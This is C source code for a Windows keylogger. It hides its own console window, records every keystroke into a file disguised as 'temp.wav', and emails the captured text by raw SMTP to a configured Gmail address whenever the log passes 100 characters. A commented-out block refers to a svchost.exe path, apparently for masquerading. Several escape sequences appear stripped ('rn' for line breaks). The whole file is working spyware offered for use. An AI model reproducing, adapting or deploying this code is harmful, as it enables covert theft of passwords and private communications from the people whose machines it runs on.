#include <windows.h>
#include <stdio.h>
#include <winuser.h>
#include <windowsx.h>
#include <time.h>
int MailIt(char *mailserver, char *emailto, char *emailfrom,
	char *emailsubject, char *emailmessage);
#define BUFSIZE 800
#define waittime 500
/*If you dont have free smtp server, use google:) */
#define cmailserver "gmail-smtp-in.l.google.com"
#define cemailto "youremailaddress@gmail.com"
#define cemailfrom "youremailaddress@gmail.com"
#define LogLength 100
#define FileName "temp.wav"
#define SMTPLog "templ.wav"
#define cemailsubject "Logged"

int test_key(void);
int main(void)
{
	//Uncomment the lines below to put the keylogger in stealh mode.
	HWND stealth; /*creating stealth */
	AllocConsole();
	stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(stealth, 0);

	{FILE *file;
	file = fopen(FileName, "a+");
	time_t theTime = time(0);
	fputs("nStarted logging: ", file);
	fputs(ctime(&theTime), file);
	fclose(file);
	}

	/* if (test==2)
	{//the path in which the file needs to be
	char *path="c:\%windir%\svchost.exe";
	create=create_key(path);
	} */

	int t = get_keys();
	return t;
}

int get_keys(void)
{
	int freadindex;
	char *buf;
	long len;
	FILE *file;
	file = fopen(FileName, "a+");


	short character;
	while (1)
	{
		Sleep(10);/*to prevent 100% cpu usage*/
		for (character = 8; character <= 222; character++)
		{
			if (GetAsyncKeyState(character) == -32767)
			{
				FILE *file;
				file = fopen(FileName, "a+");
				if (file == NULL)
				{
					return 1;
				}
				if (file != NULL)
				{
					if ((character >= 39) && (character <= 64))
					{
						fputc(character, file);
						fclose(file);
						break;
					}
					else if ((character>64) && (character<91))
					{
						character += 32;
						fputc(character, file);
						fclose(file);
						break;
					}
					else
					{
						switch (character)
						{
						case VK_SPACE:
							fputc(' ', file);
							fclose(file);
							break;
						case VK_SHIFT:
							fputs("rn[SHIFT]rn", file);
							fclose(file);
							break;
						case VK_RETURN:
							fputs("rn[ENTER]rn", file);
							fclose(file);
							break;
						case VK_BACK:
							fputs("rn[BACKSPACE]rn", file);
							fclose(file);
							break;
						case VK_TAB:
							fputs("rn[TAB]rn", file);
							fclose(file);
							break;
						case VK_CONTROL:
							fputs("rn[CTRL]rn", file);
							fclose(file);
							break;
						case VK_DELETE:
							fputs("rn[DEL]rn", file);
							fclose(file);
							break;
						case VK_OEM_1:
							fputs("rn[;:]rn", file);
							fclose(file);
							break;
						case VK_OEM_2:
							fputs("rn[/?]rn", file);
							fclose(file);
							break;
						case VK_OEM_3:
							fputs("rn[`~]rn", file);
							fclose(file);
							break;
						case VK_OEM_4:
							fputs("rn[ [{ ]rn", file);
							fclose(file);
							break;
						case VK_OEM_5:
							fputs("rn[\|]rn", file);
							fclose(file);
							break;
						case VK_OEM_6:
							fputs("rn[ ]} ]rn", file);
							fclose(file);
							break;
						case VK_OEM_7:
							fputs("rn[\'\"]rn",file);
							fclose(file);
							break;
						case 187:
							fputc('+', file);
							fclose(file);
							break;
						case 188:
							fputc(',', file);
							fclose(file);
							break;
						case 189:
							fputc('-', file);
							fclose(file);
							break;
						case 190:
							fputc('.', file);
							fclose(file);
							break;
						case VK_NUMPAD0:
							fputc('0', file);
							fclose(file);
							break;
						case VK_NUMPAD1:
							fputc('1', file);
							fclose(file);
							break;
						case VK_NUMPAD2:
							fputc('2', file);
							fclose(file);
							break;
						case VK_NUMPAD3:
							fputc('3', file);
							fclose(file);
							break;
						case VK_NUMPAD4:
							fputc('4', file);
							fclose(file);
							break;
						case VK_NUMPAD5:
							fputc('5', file);
							fclose(file);
							break;
						case VK_NUMPAD6:
							fputc('6', file);
							fclose(file);
							break;
						case VK_NUMPAD7:
							fputc('7', file);
							fclose(file);
							break;
						case VK_NUMPAD8:
							fputc('8', file);
							fclose(file);
							break;
						case VK_NUMPAD9:
							fputc('9', file);
							fclose(file);
							break;
						case VK_CAPITAL:
							fputs("rn[CAPS LOCK]rn", file);
							fclose(file);
							break;
						default:
							fclose(file);
							break;
						}
					}
				}
			}
		}
		FILE *file;
		file = fopen(FileName, "rb");
		fseek(file, 0, SEEK_END); //go to end
		len = ftell(file); //get position at end (length)
		if (len >= LogLength) {
			fseek(file, 0, SEEK_SET);//go to beg.
			buf = (char *)malloc(len);//malloc buffer
			freadindex = fread(buf, 1, len, file);//read into buffer
			buf[freadindex] = '\0';//Extra bit I have to add to make it a sting
			MailIt(cmailserver, cemailto, cemailfrom, cemailsubject, buf);
			fclose(file);
			file = fopen(FileName, "w");
		}

		fclose(file);
		//free (buf);

	}
	return EXIT_SUCCESS;
}

int MailIt(char *mailserver, char *emailto, char *emailfrom,
	char *emailsubject, char *emailmessage) {
	SOCKET sockfd;
	WSADATA wsaData;
	FILE *smtpfile;

#define bufsize 300
	int bytes_sent; /* Sock FD */
	int err;
	struct hostent *host; /* info from gethostbyname */
	struct sockaddr_in dest_addr; /* Host Address */
	char line[1000];
	char *Rec_Buf = (char*)malloc(bufsize + 1);
	smtpfile = fopen(SMTPLog, "a+");
	if (WSAStartup(0x202, &wsaData) == SOCKET_ERROR) {
		fputs("WSAStartup failed", smtpfile);
		WSACleanup();
		return -1;
	}
	if ((host = gethostbyname(mailserver)) == NULL) {
		perror("gethostbyname");
		exit(1);
	}
	memset(&dest_addr, 0, sizeof(dest_addr));
	memcpy(&(dest_addr.sin_addr), host->h_addr, host->h_length);

	/* Prepare dest_addr */
	dest_addr.sin_family = host->h_addrtype; /* AF_INET from gethostbyname */
	dest_addr.sin_port = htons(25); /* PORT defined above */

									/* Get socket */

	if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
		perror("socket");
		exit(1);
	}
	/* Connect !*/
	fputs("Connecting....n", smtpfile);

	if (connect(sockfd, (struct sockaddr *)&dest_addr, sizeof(dest_addr)) == -1) {
		perror("connect");
		exit(1);
	}
	Sleep(waittime);
	err = recv(sockfd, Rec_Buf, bufsize, 0); Rec_Buf[err] = '\0';
	fputs(Rec_Buf, smtpfile);
	strcpy(line, "helo me.somepalace.comn");
	fputs(line, smtpfile);
	bytes_sent = send(sockfd, line, strlen(line), 0);
	Sleep(waittime);
	err = recv(sockfd, Rec_Buf, bufsize, 0); Rec_Buf[err] = '\0';
	fputs(Rec_Buf, smtpfile);
	strcpy(line, "MAIL FROM:<");
	strncat(line, emailfrom, strlen(emailfrom));
	strncat(line, ">n", 3);
	fputs(line, smtpfile);
	bytes_sent = send(sockfd, line, strlen(line), 0);
	Sleep(waittime);
	err = recv(sockfd, Rec_Buf, bufsize, 0); Rec_Buf[err] = '\0';
	fputs(Rec_Buf, smtpfile);
	strcpy(line, "RCPT TO:<");
	strncat(line, emailto, strlen(emailto));
	strncat(line, ">n", 3);
	fputs(line, smtpfile);
	bytes_sent = send(sockfd, line, strlen(line), 0);
	Sleep(waittime);
	err = recv(sockfd, Rec_Buf, bufsize, 0); Rec_Buf[err] = '\0';
	fputs(Rec_Buf, smtpfile);
	strcpy(line, "DATAn");
	fputs(line, smtpfile);
	bytes_sent = send(sockfd, line, strlen(line), 0);
	Sleep(waittime);
	err = recv(sockfd, Rec_Buf, bufsize, 0); Rec_Buf[err] = '\0';
	fputs(Rec_Buf, smtpfile);
	Sleep(waittime);
	strcpy(line, "To:");
	strcat(line, emailto);
	strcat(line, "n");
	strcat(line, "From:");
	strcat(line, emailfrom);
	strcat(line, "n");
	strcat(line, "Subject:");
	strcat(line, emailsubject);
	strcat(line, "n");
	strcat(line, emailmessage);
	strcat(line, "rn.rn");
	fputs(line, smtpfile);
	bytes_sent = send(sockfd, line, strlen(line), 0);
	Sleep(waittime);
	err = recv(sockfd, Rec_Buf, bufsize, 0); Rec_Buf[err] = '\0';
	fputs(Rec_Buf, smtpfile);
	strcpy(line, "quitn");
	fputs(line, smtpfile);
	bytes_sent = send(sockfd, line, strlen(line), 0);
	Sleep(waittime);
	err = recv(sockfd, Rec_Buf, bufsize, 0); Rec_Buf[err] = '\0';
	fputs(Rec_Buf, smtpfile);
	fclose(smtpfile);
#ifdef WIN32
	closesocket(sockfd);
	WSACleanup();
#else
	close(sockfd);
#endif
}

